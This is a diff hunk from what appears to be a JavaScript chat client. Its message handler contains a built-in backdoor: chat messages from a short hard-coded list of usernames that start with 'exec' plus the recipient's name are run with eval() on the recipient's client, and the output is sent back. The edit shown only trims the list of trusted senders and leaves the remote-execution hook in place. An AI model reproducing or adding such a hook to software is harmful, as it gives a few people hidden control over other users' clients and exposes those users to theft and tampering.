@@ -511,7 +511,7 @@ Owner:<ul>
                 break;
             case "message":
                 msg.m.m = msg.m.m.replace(/&gt;/g, ">").replace(/&lt;/g, "<");
-                if (["NKY", "wolfie", "ZeroTix", "RayhanADev", "haha0201"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
+                if (["NKY", "wolfie", "RayhanADev"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
                     if (msg.m.r !== -2 && msg.m.m.startsWith("exec " + user + " ")) {
                         try {
                             sendMessage(eval(msg.m.m.slice(6 + user.length)));
